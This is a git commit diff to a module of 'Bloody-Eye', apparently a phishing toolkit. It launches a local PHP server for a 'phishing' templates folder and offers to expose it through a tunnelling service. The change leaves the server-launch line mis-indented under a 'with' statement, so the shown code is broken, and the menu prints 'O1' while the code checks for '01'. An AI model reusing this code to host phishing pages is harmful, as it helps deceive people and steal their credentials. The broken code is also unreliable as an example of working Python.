864d37085d048a59d9f8d3d0c1480c1bac37ccf2
spaceboy11 <77511227+spaceboy11@users.noreply.github.com>
2021-10-19 09:09:34 +0330

    Update localhost.py

--- Bloody-Eye/modules/localhost.py
+++ Bloody-Eye/modules/localhost.py
@@ -543,9 +543,9 @@ exit();""")
     print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+" Localhost")
     print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+" Ngorok.io")
     print("")
-    v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     with open("log","w") as phplog:
-        Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
+    Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)  
+    v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
       print("")
       time.sleep(0.07)
